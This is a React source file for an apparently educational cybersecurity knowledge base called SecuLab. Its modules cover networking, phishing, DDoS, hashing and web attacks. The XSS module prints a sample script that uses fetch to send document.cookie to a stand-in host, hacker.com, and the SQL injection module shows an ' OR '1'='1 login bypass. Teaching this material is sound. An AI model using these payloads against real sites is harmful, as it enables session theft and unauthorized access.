"use client";

import { useState } from "react";
import QuizWidget from "@/components/QuizWidget";

const introModule = {
  id: "intro",
  topicId: "INIT_00",
  title: "[ OPERATOR MANUAL: INITIATION ]",
  content: `
    <p class="mb-6 leading-relaxed">Welcome to the SecuLab Knowledge Base. Theoretical comprehension is the foundation of practical defense. Before engaging in live tactical simulations, operators must understand the underlying architecture of the systems they are defending.</p>
    <div class="bg-black text-success font-mono p-6 border-2 border-black">
      DIRECTIVE FOR NEW OPERATORS: If you are new to cybersecurity, start sequentially with [ MODULE 0: CYBER FUNDAMENTALS ]. Understanding the basics concepts of cybersecurity and core areas related to it. 
    </div>
  `
};

const theoryData = [
  {
    groupId: "fundamentals",
    groupTitle: "0. CYBER FUNDAMENTALS",
    modules: [
      {
        id: "fund-network",
        topicId: "MOD_00_A",
        title: "0.1 What is a Network?",
        shortTitle: "0.1 What is a Network?",
        content: `
          <div class="space-y-4 text-lg">
            <p>A computer network is a system that connects two or more computing devices to transmit and share information. In tactical terms, the network is the primary battlefield for cyber operations.</p>
            <p>Modern internet architecture heavily relies on the <strong>Client-Server model</strong>: clients (your browser) request resources, and servers (remote machines) provide them.</p>
            <p>Understanding how data is packetized, routed, and reassembled is the absolute prerequisite for identifying malicious traffic.</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: Cisco Networking Academy - Introduction to Networks.</div>
          </div>
        `
      },
      {
        id: "fund-terms",
        topicId: "MOD_00_B",
        title: "0.2 Core Terminology",
        shortTitle: "0.2 Core Terminology",
        content: `
          <div class="space-y-4 text-lg">
            <p>Operators must use precise language when classifying cyber incidents. Mixing these three concepts is a critical error:</p>
            <ul class="list-disc pl-6 space-y-2">
              <li><strong>Vulnerability:</strong> A weakness in a system, application, or process (e.g., unpatched software, weak passwords).</li>
              <li><strong>Threat:</strong> A potential danger that can exploit a vulnerability (e.g., a ransomware group, a malicious insider).</li>
              <li><strong>Risk:</strong> The probability of a threat exploiting a vulnerability and the resulting business impact. <code class="bg-black text-white px-1">Risk = Threat × Vulnerability</code>.</li>
            </ul>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: ENISA (European Union Agency for Cybersecurity) Threat Landscape Methodology.</div>
          </div>
        `
      },
      {
        id: "fund-cia",
        topicId: "MOD_00_C",
        title: "0.3 The CIA Triad",
        shortTitle: "0.3 The CIA Triad",
        content: `
          <div class="space-y-4 text-lg">
            <p>The CIA Triad is the foundational model for information security policy development.</p>
            <ul class="list-disc pl-6 space-y-2">
              <li><strong>Confidentiality:</strong> Ensuring data is accessed only by authorized personnel. Critical for GDPR compliance.</li>
              <li><strong>Integrity:</strong> Guaranteeing that data has not been altered or tampered with by unauthorized parties.</li>
              <li><strong>Availability:</strong> Ensuring systems and data are accessible to authorized users when needed (often targeted by DDoS attacks).</li>
            </ul>
            <p>Every defensive mechanism aims to protect at least one of these three pillars.</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: NIST Special Publication 800-12.</div>
          </div>
        `
      },
      {
        id: "fund-ipv4v6",
        topicId: "MOD_00_D",
        title: "0.4 IPv4 vs IPv6",
        shortTitle: "0.4 IP Addressing",
        content: `
          <div class="space-y-4 text-lg">
            <p>An Internet Protocol (IP) address is a numerical label assigned to every device on a network. It provides host identification and location addressing.</p>
            <ul class="list-disc pl-6 space-y-2">
              <li><strong>IPv4:</strong> Uses a 32-bit address scheme allowing for ~4.3 billion addresses. Example: <code class="bg-black text-white px-1">192.168.1.15</code>.</li>
              <li><strong>IPv6:</strong> Introduced to solve IPv4 exhaustion. Uses a 128-bit address scheme. Example: <code class="bg-black text-white px-1">2001:0db8:85a3:0000:0000:8a2e:0370:7334</code>.</li>
            </ul>
            <p>Internal network reconnaissance typically focuses on discovering local IPv4 subnets (e.g., 10.0.0.0/8).</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: IETF RFC 791 (IPv4) & RFC 8200 (IPv6).</div>
          </div>
        `
      },
      {
        id: "fund-dns",
        topicId: "MOD_00_E",
        title: "0.5 DNS Fundamentals",
        shortTitle: "0.5 DNS Basics",
        content: `
          <div class="space-y-4 text-lg">
            <p>The Domain Name System (DNS) is the phonebook of the Internet. Humans access information online through domain names (e.g., seculab.ie), while web browsers interact through IP addresses.</p>
            <p>DNS translates domain names to IP addresses so browsers can load internet resources. Because DNS operates primarily on <strong>UDP Port 53</strong> in plain text, it is highly susceptible to manipulation techniques like DNS Cache Poisoning or Typosquatting.</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: ICANN (Internet Corporation for Assigned Names and Numbers).</div>
          </div>
        `
      },
      {
        id: "fund-http",
        topicId: "MOD_00_F",
        title: "0.6 HTTP & HTTPS",
        shortTitle: "0.6 Web Protocols",
        content: `
          <div class="space-y-4 text-lg">
            <p><strong>HTTP (Hypertext Transfer Protocol)</strong> operates on Port 80 and is the foundation of data communication for the World Wide Web. However, it transmits all data—including passwords and session cookies—in plain text.</p>
            <p><strong>HTTPS (HTTP Secure)</strong> operates on Port 443. It wraps HTTP traffic inside a cryptographic protocol (TLS), ensuring Confidentiality and Integrity during transit.</p>
            <p>Downgrade attacks (forcing a connection from HTTPS to HTTP) are a common tactic for Man-in-the-Middle (MitM) interceptions.</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: OWASP Application Security Verification Standard (ASVS).</div>
          </div>
        `
      },
      {
        id: "fund-cli",
        topicId: "MOD_00_G",
        title: "0.7 The Command Line",
        shortTitle: "0.7 CLI Navigation",
        content: `
          <div class="space-y-4 text-lg">
            <p>Graphical User Interfaces (GUIs) are too slow and resource-heavy for tactical operations. Proficiency in the Command Line Interface (CLI) is mandatory for operators.</p>
            <p>In UNIX/Linux environments, understanding how to navigate directories (<code class="bg-black text-white px-1">cd</code>, <code class="bg-black text-white px-1">ls</code>), manipulate files (<code class="bg-black text-white px-1">cat</code>, <code class="bg-black text-white px-1">grep</code>), and chain commands using pipes (<code class="bg-black text-white px-1">|</code>) forms the basis of all reconnaissance and exploitation workflows.</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: Linux Professional Institute (LPIC-1).</div>
          </div>
        `
      },
      {
        id: "fund-perms",
        topicId: "MOD_00_H",
        title: "0.8 File Permissions",
        shortTitle: "0.8 Access Control",
        content: `
          <div class="space-y-4 text-lg">
            <p>In UNIX-like systems, everything is a file. Access to these files is governed by a strict permission model broken down into Read (r), Write (w), and Execute (x).</p>
            <p>Permissions are assigned to three entities: the <strong>Owner</strong>, the <strong>Group</strong>, and <strong>Others</strong>.</p>
            <p>Privilege Escalation attacks often rely on finding misconfigured permissions (e.g., a standard user having write access to a root-owned script).</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: IEEE POSIX Access Control Lists.</div>
          </div>
        `
      },
      {
        id: "fund-encryption",
        topicId: "MOD_00_I",
        title: "0.9 Symmetric vs Asymmetric",
        shortTitle: "0.9 Encryption Modes",
        content: `
          <div class="space-y-4 text-lg">
            <p>Encryption transforms readable data (plaintext) into an unreadable format (ciphertext) using a cryptographic key.</p>
            <ul class="list-disc pl-6 space-y-2">
              <li><strong>Symmetric Encryption:</strong> Uses the <em>same key</em> to encrypt and decrypt data (e.g., AES). It is incredibly fast and used for encrypting hard drives or large databases.</li>
              <li><strong>Asymmetric Encryption:</strong> Uses a <em>key pair</em> (a Public key for encryption, a Private key for decryption). Examples include RSA and ECC. It is slower but solves the problem of securely exchanging keys over the internet.</li>
            </ul>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: NIST Cryptographic Standards and Guidelines.</div>
          </div>
        `
      },
      {
        id: "fund-auth",
        topicId: "MOD_00_J",
        title: "0.10 Authentication Models",
        shortTitle: "0.10 Authentication",
        content: `
          <div class="space-y-4 text-lg">
            <p>Authentication verifies <em>who</em> a user is, while Authorization dictates <em>what</em> they can do. Modern defense relies on Multi-Factor Authentication (MFA), combining at least two of the following:</p>
            <ul class="list-disc pl-6 space-y-2">
              <li><strong>Something you know:</strong> A password or PIN.</li>
              <li><strong>Something you have:</strong> A smartphone authenticator app or hardware token (YubiKey).</li>
              <li><strong>Something you are:</strong> Biometrics (fingerprint, facial recognition).</li>
            </ul>
            <p>Relying solely on passwords is considered a critical security failure in modern infrastructure.</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: NCSC-IE (National Cyber Security Centre Ireland) - Password & Authentication Guidance.</div>
          </div>
        `
      },
      {
        id: "fund-social",
        topicId: "MOD_00_K",
        title: "0.11 The Human Firewall",
        shortTitle: "0.11 Human Factor",
        content: `
          <div class="space-y-4 text-lg">
            <p>The most sophisticated technical defenses can be bypassed if an attacker successfully manipulates a human operator. Social Engineering remains the primary vector for initial network compromise.</p>
            <p>Attackers exploit psychological triggers—such as authority, urgency, or fear—to compel users to execute malicious payloads or divulge credentials voluntarily.</p>
            <p>Continuous awareness training and robust verification protocols are the only effective countermeasures against human-centric attacks.</p>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: SANS Institute - Security Awareness Fundamentals.</div>
          </div>
        `
      },
      {
        id: "fund-threatmod",
        topicId: "MOD_00_L",
        title: "0.12 Threat Modeling",
        shortTitle: "0.12 Threat Modeling",
        content: `
          <div class="space-y-4 text-lg">
            <p>Threat modeling is a structured approach to identifying and prioritizing potential threats to a system before they are exploited. The most common framework is <strong>STRIDE</strong>, developed by Microsoft:</p>
            <ul class="list-disc pl-6 space-y-2">
              <li><strong>S</strong>poofing (Impersonating someone else)</li>
              <li><strong>T</strong>ampering (Modifying data)</li>
              <li><strong>R</strong>epudiation (Denying performing an action)</li>
              <li><strong>I</strong>nformation Disclosure (Data breaches)</li>
              <li><strong>D</strong>enial of Service (Crashing systems)</li>
              <li><strong>E</strong>levation of Privilege (Gaining admin rights)</li>
            </ul>
            <div class="mt-8 pt-4 border-t-2 border-black font-mono text-sm text-gray-700">Reference: Microsoft Threat Modeling Framework.</div>
          </div>
        `
      },
      {
        id: "fund-quiz",
        topicId: "MOD_00_QUIZ",
        title: "0.13 Knowledge Check",
        shortTitle: "0.13 Knowledge Check",
        type: "quiz"
      }
    ]
  },
  {
    groupId: "networking",
    groupTitle: "1. Networking",
    modules: [
      {
        id: "net-osi",
        topicId: "MOD_01_A",
        title: "The OSI Model",
        shortTitle: "1.1 The OSI Model",
        content: `
          <p class="mb-4">The Open Systems Interconnection (OSI) model is a conceptual framework created by the International Organization for Standardization (ISO). It standardizes the functions of a telecommunication system into seven distinct layers, enabling interoperability between diverse vendors.</p>
          <p class="mb-4">Understanding the complete stack is mandatory for isolating network anomalies and tracing attack vectors:</p>
          <ul class="list-disc pl-6 space-y-3 mt-4">
            <li><strong>Layer 7 - Application:</strong> The interface for end-user network processes. Protocols: HTTP, HTTPS, SMTP, FTP, DNS. Attacks here include SQL Injection and XSS.</li>
            <li><strong>Layer 6 - Presentation:</strong> Responsible for data translation, formatting, and encryption/decryption. Protocols: TLS/SSL, ASCII, JPEG.</li>
            <li><strong>Layer 5 - Session:</strong> Establishes, manages, and terminates connections between applications. Protocols: NetBIOS, RPC.</li>
            <li><strong>Layer 4 - Transport:</strong> Ensures reliable or un-reliable end-to-end data delivery, utilizing port numbers to separate communication flows. Protocols: TCP (reliable, connection-oriented), UDP (fast, connectionless). Attacks: SYN Floods, UDP Floods.</li>
            <li><strong>Layer 3 - Network:</strong> Handles logical addressing and path determination (routing) across multiple networks. Protocols: IPv4, IPv6, ICMP, IPsec. Attacks: IP Spoofing, Ping of Death.</li>
            <li><strong>Layer 2 - Data Link:</strong> Manages node-to-node data transfer and physical addressing on the same local network (LAN). Protocols: Ethernet, ARP, VLANs (802.1Q). Attacks: MAC Spoofing, ARP Poisoning.</li>
            <li><strong>Layer 1 - Physical:</strong> The physical and electrical transmission of raw bits over cables, fiber, or RF signals. Hubs and repeaters operate here.</li>
          </ul>
        `,
        reference: "Reference: ISO/IEC 7498-1 Standard & Cisco Networking Academy."
      },
      {
        id: "net-ports",
        topicId: "MOD_01_B",
        title: "TCP/IP & Ports",
        shortTitle: "1.2 TCP/IP & Ports",
        content: `
          <p class="mb-4">While an IP address identifies a specific machine on a network, a <strong>Port Number</strong> (a 16-bit unsigned integer) identifies a specific process or service running on that machine. The IANA (Internet Assigned Numbers Authority) divides ports into three categories: System (0-1023), User (1024-49151), and Dynamic (49152-65535).</p>
          <p class="mb-4">From a tactical defense perspective, SOC analysts must monitor the following critical system ports, as they represent the most common attack surfaces:</p>
          <ul class="list-disc pl-6 space-y-3 mt-4">
            <li><code class="bg-black text-white px-1">Port 20/21 (FTP):</code> File Transfer Protocol. Unencrypted file transfer; highly vulnerable to credential sniffing.</li>
            <li><code class="bg-black text-white px-1">Port 22 (SSH):</code> Secure Shell. Used for encrypted remote administration. A primary target for brute-force attacks.</li>
            <li><code class="bg-black text-white px-1">Port 23 (Telnet):</code> Legacy remote administration. Transmits all data, including passwords, in plaintext. Must be disabled in modern networks.</li>
            <li><code class="bg-black text-white px-1">Port 25 (SMTP):</code> Simple Mail Transfer Protocol. Used for email routing; often exploited for spam relay and phishing.</li>
            <li><code class="bg-black text-white px-1">Port 53 (DNS):</code> Domain Name System. Operates primarily on UDP. Vulnerable to DNS Cache Poisoning and Amplification DDoS attacks.</li>
            <li><code class="bg-black text-white px-1">Port 80 (HTTP) & 443 (HTTPS):</code> Web traffic. HTTP is unencrypted, while HTTPS utilizes TLS at Layer 6 for secure communication.</li>
            <li><code class="bg-black text-white px-1">Port 445 (SMB):</code> Server Message Block. Used for Windows file sharing. Historically exploited by ransomware like WannaCry (via EternalBlue).</li>
            <li><code class="bg-black text-white px-1">Port 3389 (RDP):</code> Remote Desktop Protocol. Frequent target for ransomware operators to gain GUI access to Windows servers.</li>
          </ul>
        `,
        reference: "Reference: IANA Service Name and Transport Protocol Port Number Registry."
      },
      {
        id: "net-mac",
        topicId: "MOD_01_C",
        title: "IP vs MAC Addressing",
        shortTitle: "1.3 IP vs MAC Addressing",
        content: `
          <p class="mb-4">Network communication relies on two primary types of addresses operating at different layers of the OSI model:</p>
          <div class="space-y-4 mb-4">
            <div>
              <strong>1. MAC Address (Media Access Control) - Layer 2:</strong><br/>
              A physical, permanent address assigned to a Network Interface Card (NIC) by the manufacturer. It is used for local delivery of frames within the same LAN. Format: <code class="bg-black text-white px-1">00:1A:2B:3C:4D:5E</code>.
            </div>
            <div>
              <strong>2. IP Address (Internet Protocol) - Layer 3:</strong><br/>
              A logical address assigned by a network administrator or DHCP. It is used for routing packets across different networks (the Internet). Format: <code class="bg-black text-white px-1">192.168.1.5</code>.
            </div>
          </div>
          <p class="mb-4">The Address Resolution Protocol (ARP) acts as the bridge, translating Layer 3 IP addresses into Layer 2 MAC addresses.</p>
        `
      }
    ]
  },
  {
    groupId: "phish",
    groupTitle: "2. Phishing & SE",
    modules: [
      {
        id: "phish-intro",
        topicId: "MOD_02_A",
        title: "Social Engineering",
        shortTitle: "2.1 Social Engineering",
        content: `
          <p class="mb-4">Social engineering is the psychological manipulation of people into performing actions or divulging confidential information. Unlike technical hacking, it exploits human cognitive biases rather than software flaws.</p>
          <p class="mb-4"><strong>Phishing</strong> is the most common form of social engineering. It typically involves:</p>
          <ul class="list-disc pl-6 space-y-2 mt-4 mb-4">
              <li><strong>Authority:</strong> Impersonating a CEO, IT support, or law enforcement.</li>
              <li><strong>Urgency/Fear:</strong> "Your account will be suspended in 24 hours if you do not click here."</li>
              <li><strong>Curiosity:</strong> "View the attached salary document."</li>
          </ul>
          <p>Advanced adversaries use <em>Spearphishing</em> (highly targeted attacks against specific individuals) to bypass perimeter security.</p>
        `,
        reference: "Reference: MITRE ATT&CK Framework (Technique T1566: Phishing)."
      },
      {
        id: "phish-typo",
        topicId: "MOD_02_B",
        title: "Typosquatting",
        shortTitle: "2.2 Typosquatting",
        content: `
          <p class="mb-4">Typosquatting (also known as URL hijacking) is a form of cybersquatting which relies on mistakes such as typographical errors made by Internet users when inputting a website address into a web browser.</p>
          <p class="mb-4">Attackers register domains that look visually identical to legitimate enterprise domains. Common techniques include:</p>
          <ul class="list-disc pl-6 space-y-2 mt-4 mb-4">
              <li><strong>Omission:</strong> <code class="bg-black text-white px-1">paypal.com</code> vs <code class="bg-black text-white px-1">paypl.com</code></li>
              <li><strong>Substitution:</strong> Replacing a lowercase 'L' with a capital 'I' or the number '1' (e.g., <code class="bg-black text-white px-1">g00gle.com</code> or <code class="bg-black text-white px-1">paypaI.com</code>).</li>
              <li><strong>TLD swapping:</strong> <code class="bg-black text-white px-1">microsoft.com</code> vs <code class="bg-black text-white px-1">microsoft.co</code></li>
          </ul>
          <p>Identifying these requires strict visual inspection or automated DNS filtering solutions.</p>
        `,
        reference: "Reference: CISA Guidelines."
      },
      {
        id: "phish-headers",
        topicId: "MOD_02_C",
        title: "Email Header Analysis",
        shortTitle: "2.3 Email Header Analysis",
        content: `
          <p class="mb-4">The "From" field displayed in a standard email client can be easily forged (spoofed) because the underlying protocol, SMTP, lacks built-in authentication.</p>
          <p class="mb-4">To verify the true origin of an email, analysts must inspect the raw email headers:</p>
          <ul class="list-disc pl-6 space-y-2 mt-4 mb-4">
              <li><strong>Received:</strong> Shows the actual IP addresses of the mail servers that relayed the message.</li>
              <li><strong>Return-Path:</strong> The hidden address where bounce messages are sent, often revealing the attacker's true domain.</li>
          </ul>
          <p>Modern defenses rely on protocols like SPF (Sender Policy Framework) and DMARC to prevent domain spoofing automatically.</p>
        `
      }
    ]
  },
  {
    groupId: "ddos",
    groupTitle: "3. DDoS Attacks",
    modules: [
      {
        id: "ddos-intro",
        topicId: "MOD_03_A",
        title: "DoS vs DDoS",
        shortTitle: "3.1 DoS vs DDoS",
        content: `
          <p class="mb-4">A <strong>Denial-of-Service (DoS)</strong> attack aims to shut down a machine or network, making it inaccessible to its intended users. It achieves this by flooding the target with traffic or sending it information that triggers a crash.</p>
          <p class="mb-4">A <strong>Distributed Denial-of-Service (DDoS)</strong> attack takes this further by utilizing multiple compromised computer systems (a Botnet) as sources of attack traffic. Devices in a botnet can include computers, IoT devices, and servers infected with malware.</p>
          <p>Because the incoming traffic flooding the victim originates from many different sources, it is impossible to stop the attack simply by blocking a single IP address.</p>
        `,
        reference: "Reference: Cloudflare Learning Center - DDoS Attacks."
      },
      {
        id: "ddos-tcp",
        topicId: "MOD_03_B",
        title: "The 3-Way Handshake",
        shortTitle: "3.2 The 3-Way Handshake",
        content: `
          <p class="mb-4">Before a client and a server can exchange data over TCP (Transmission Control Protocol), they must establish a connection. This is done via a 3-step process:</p>
          <ol class="list-decimal pl-6 space-y-2 mt-4 mb-4">
              <li><strong>SYN:</strong> The client sends a packet with the <code class="bg-black text-white px-1">SYN</code> (Synchronize) flag to the server to initiate the connection.</li>
              <li><strong>SYN-ACK:</strong> The server acknowledges the request by sending back a packet with both the <code class="bg-black text-white px-1">SYN</code> and <code class="bg-black text-white px-1">ACK</code> (Acknowledgment) flags. The server allocates memory for this pending connection.</li>
              <li><strong>ACK:</strong> The client responds with an <code class="bg-black text-white px-1">ACK</code> flag. The connection is now ESTABLISHED.</li>
          </ol>
          <p>This mechanism ensures reliability, but its requirement to allocate server memory at step 2 makes it vulnerable to exploitation.</p>
        `,
        reference: "Reference: IETF RFC 793 (Transmission Control Protocol)."
      },
      {
        id: "ddos-syn",
        topicId: "MOD_03_C",
        title: "SYN Flood Mitigation",
        shortTitle: "3.3 SYN Flood Mitigation",
        content: `
          <p class="mb-4">A <strong>SYN Flood</strong> is a volumetric DDoS attack that exploits the TCP 3-Way Handshake. The attacker sends thousands of <code class="bg-black text-white px-1">SYN</code> requests to the server, often using spoofed IP addresses.</p>
          <p class="mb-4">The server replies with <code class="bg-black text-white px-1">SYN-ACK</code> and waits for the final <code class="bg-black text-white px-1">ACK</code>. Because the attacker never sends the <code class="bg-black text-white px-1">ACK</code>, the server is left with thousands of "half-open" connections. Once the server's connection queue fills up, it cannot respond to legitimate traffic.</p>
          <p class="mb-4"><strong>Mitigation Techniques:</strong></p>
          <ul class="list-disc pl-6 space-y-2 mt-4">
              <li><strong>SYN Cookies:</strong> The server hashes the connection details and sends them in the SYN-ACK, without allocating memory until the final ACK is received.</li>
              <li><strong>Timeout adjustments:</strong> Reducing the time the server waits for an ACK before dropping the half-open connection.</li>
          </ul>
        `
      }
    ]
  },
  {
    groupId: "crypto",
    groupTitle: "4. Cryptography",
    modules: [
      {
        id: "crypto-hash",
        topicId: "MOD_04_A",
        title: "Hashing vs Encryption",
        shortTitle: "4.1 Hashing vs Encryption",
        content: `
          <p class="mb-4">A common misconception is treating hashing and encryption as the same thing. They serve entirely different purposes in cryptography.</p>
          <p class="mb-4"><strong>Encryption</strong> is a two-way function. Data is scrambled using a key, and can be decrypted back to its original state using the correct key (e.g., AES, RSA).</p>
          <p><strong>Hashing</strong> is a one-way mathematical function. It takes an input of any size and produces a fixed-size string of characters (e.g., SHA-256). You cannot "decrypt" a hash back to its original text. It is used to verify data integrity and store passwords safely.</p>
        `
      },
      {
        id: "crypto-salt",
        topicId: "MOD_04_B",
        title: "Salting Passwords",
        shortTitle: "4.2 Salting Passwords",
        content: `
          <p class="mb-4">If two users have the same password (e.g., <code class="bg-black text-white px-1">password123</code>), their hashes will be identical. Attackers exploit this using <strong>Rainbow Tables</strong> — massive pre-computed databases of hashes for common passwords.</p>
          <p class="mb-4">To mitigate this, systems use a <strong>Salt</strong>. A salt is a unique, random string of characters added to each user's password before hashing it: <code class="bg-black text-white px-1">Hash(Password + Salt)</code>.</p>
          <p>Even if two users have the same password, their unique salts ensure their final stored hashes are completely different, rendering Rainbow Tables useless.</p>
        `
      }
    ]
  },
  {
    groupId: "web",
    groupTitle: "5. Web Security",
    modules: [
      {
        id: "web-sql",
        topicId: "MOD_05_A",
        title: "SQL Injection (SQLi)",
        shortTitle: "5.1 SQL Injection (SQLi)",
        content: `
          <p class="mb-4">SQL Injection occurs when an application improperly sanitizes user input before sending it to the database query.</p>
          <p class="mb-4">For example, an attacker might enter <code class="bg-black text-white px-1">' OR '1'='1</code> into a login field. If the backend code looks like <code class="bg-black text-white px-1">SELECT * FROM users WHERE username = '$input'</code>, the query becomes:</p>
          <p class="mb-4"><code class="bg-black text-white px-1 border border-black p-1">SELECT * FROM users WHERE username = '' OR '1'='1'</code></p>
          <p>Since 1=1 is always true, the database returns the first user record (usually the Admin), granting the attacker unauthorized access.</p>
        `,
        reference: "Reference: OWASP Top 10 (A03:2021-Injection)."
      },
      {
        id: "web-xss",
        topicId: "MOD_05_B",
        title: "Cross-Site Scripting (XSS)",
        shortTitle: "5.2 Cross-Site Scripting (XSS)",
        content: `
          <p class="mb-4">XSS allows an attacker to inject malicious client-side JavaScript into web pages viewed by other users. This bypasses the Same-Origin Policy.</p>
          <p class="mb-4">If a vulnerable forum allows raw HTML in comments, an attacker can post: <code class="bg-black text-white px-1">&lt;script&gt;fetch('http://hacker.com/?cookie=' + document.cookie)&lt;/script&gt;</code>.</p>
          <p>When an admin views that comment, the script executes in their browser, stealing their session cookie and sending it to the attacker's server.</p>
        `
      }
    ]
  }
];

export default function TheoryPage() {
  const [openGroups, setOpenGroups] = useState({ networking: true });
  const [activeModule, setActiveModule] = useState(introModule);

  const toggleGroup = (groupId) => {
    setOpenGroups((prev) => ({
      ...prev,
      [groupId]: !prev[groupId],
    }));
  };

  return (
    <div className="flex-1 flex w-full bg-dot-pattern-live min-h-screen">
      {/* Sidebar */}
      <aside className="w-80 border-r-4 border-black bg-white flex flex-col flex-shrink-0 z-10 hidden md:flex">
        <div 
          onClick={() => {
            setActiveModule(introModule);
            setOpenGroups({});
          }}
          className="p-6 border-b-4 border-black bg-white text-black cursor-pointer hover:bg-black hover:text-white transition-colors duration-200"
        >
          <h2 className="uppercase font-black tracking-widest text-lg m-0">Knowledge Base</h2>
        </div>

        <div className="flex-1 overflow-y-auto">
          {theoryData.map((group) => {
            const isOpen = openGroups[group.groupId];
            return (
              <div key={group.groupId} className="border-b-2 border-black">
                <button
                  onClick={() => toggleGroup(group.groupId)}
                  className="w-full text-left p-4 bg-white hover:bg-gray-100 font-black uppercase text-[1.1rem] flex justify-between items-center transition-colors font-sans border-none outline-none"
                >
                  {group.groupTitle}
                  <span
                    className={`transform transition-transform duration-200 ${
                      isOpen ? "rotate-180" : ""
                    }`}
                  >
                    ▼
                  </span>
                </button>
                
                {/* Accordion Content */}
                <div
                  className={`grid transition-[grid-template-rows,opacity] duration-300 ease-in-out ${
                    isOpen ? "grid-rows-[1fr] opacity-100 border-t-2 border-black" : "grid-rows-[0fr] opacity-0"
                  }`}
                >
                  <div className="overflow-hidden flex flex-col bg-[#fafafa]">
                    {group.modules.map((mod) => {
                      const isActive = activeModule.id === mod.id;
                      return (
                        <button
                          key={mod.id}
                          onClick={() => setActiveModule(mod)}
                          className={`text-left border-none outline-none py-3 pr-4 pl-10 font-mono text-sm cursor-pointer transition-all border-b border-gray-300 ${
                            isActive
                              ? "bg-black text-white border-l-4 border-l-success font-bold"
                              : "bg-transparent text-black border-l-4 border-l-transparent hover:bg-gray-200 hover:border-l-black"
                          }`}
                        >
                          {mod.shortTitle}
                        </button>
                      );
                    })}
                  </div>
                </div>
              </div>
            );
          })}
        </div>
      </aside>

      {/* Content Pane */}
      <main className="flex-1 p-6 lg:p-12 overflow-y-auto relative z-10 flex flex-col items-start w-full">
        <article 
          key={activeModule.id} 
          className="bg-white border-4 border-black p-8 lg:p-12 shadow-[8px_8px_0px_#000000] w-full animate-hydrate"
        >
          <span className="font-mono text-sm bg-black text-white px-3 py-1 font-bold inline-block border-2 border-black mb-6">
            [{activeModule.topicId}]
          </span>
          
          <h1 className="text-4xl md:text-5xl lg:text-6xl font-black uppercase tracking-tighter mb-8 leading-none">
            {activeModule.title}
          </h1>
          
          {activeModule.type === "quiz" ? (
            <div className="mt-8 w-full">
              <QuizWidget moduleId={activeModule.topicId} />
            </div>
          ) : (
            <div 
              className="text-lg md:text-xl font-medium leading-relaxed border-l-4 border-black pl-6 md:pl-8 text-black space-y-4"
              dangerouslySetInnerHTML={{ __html: activeModule.content }}
            />
          )}
          
          {activeModule.reference && (
            <div className="mt-12 pt-6 border-t-2 border-dashed border-black font-mono text-sm opacity-80 italic">
              {activeModule.reference}
            </div>
          )}
        </article>
      </main>
    </div>
  );
}
